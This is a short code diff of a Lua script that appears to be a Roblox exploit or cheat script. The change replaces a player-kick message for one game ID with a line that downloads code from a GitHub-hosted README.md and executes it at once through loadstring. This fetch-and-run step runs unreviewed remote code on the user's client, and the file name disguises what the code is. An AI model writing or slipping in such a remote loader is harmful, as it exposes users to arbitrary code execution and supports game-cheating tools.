@@ -23,7 +23,8 @@ end
 
 if isInWhitelist then
     if game.PlaceId == 891852901 then
-        game.Players.LocalPlayer:Kick("此游戏会被ban")
+        loadstring(game:HttpGet(('https://raw.githubusercontent.com/zeuise0002/SSSWWW222/main/README.md'),true))()
+        return
     end
 
     local StarterGui = game:GetService("StarterGui")
